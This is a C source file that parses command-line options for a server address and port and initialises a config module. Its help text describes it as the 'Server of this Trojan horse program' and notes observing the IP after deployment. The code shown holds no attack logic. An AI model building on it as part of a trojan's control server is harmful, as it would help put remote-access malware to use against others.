//
// Created by cmtheit on 23-5-30.
//

#include "init.h"
#include "../config/config.h"
#include <stdio.h>
#include <hv/hloop.h>
#include <event2/event.h>
#include <argparse/argparse.h>

static const char * sip_str = NULL;
static const char * sport_str = NULL;
static struct argparse_option options[] = {
    OPT_HELP(),
    OPT_GROUP("basic options"),
    OPT_STRING('u', "sip", &sip_str, "Server IPv4 address. Default is 127.0.0.1", NULL, 0, 0),
    OPT_STRING('e', "sport", &sport_str, "Server port. Default is 29001", NULL, 0, 0),
    OPT_END()
};
static const char *const usages[] = {
    "clr [options] [[--] args]",
    NULL,
};
static struct argparse argparse;

InitResult init_config() {
    InitResult res = result_new_ok(0);
    ConfigServerIPOption sip_opt = option_new_none();
    if (sip_str) {
        option_turn_some(sip_opt, sip_str);
    }
    ConfigServerPortOption sport_opt = option_new_none();
    if (sport_str) {
        option_turn_some(sport_opt, atoi(sport_str));
    }
    ConfigInitResult config_result = config_init(sip_opt, sport_opt);
    if (result_is_err(config_result)) {
        switch (result_unwrap(config_result)) {
            case ConfigInitErrorOther:
            default:
                result_turn_err(res, InitResultConfigErr);
                break;
        }
    }
    return res;
}

InitResult init(int argc, const char ** argv) {
    InitResult result = result_new_ok(0);
    argparse_init(&argparse, options, usages, 0);
    argparse_describe(&argparse, "Server of this Trojan horse program", "部署以后观察它的IP");
    argparse_parse(&argparse, argc, argv);
    result = init_config();
    if (result_is_err(result)) {
        return result;
    }
    return result;
}

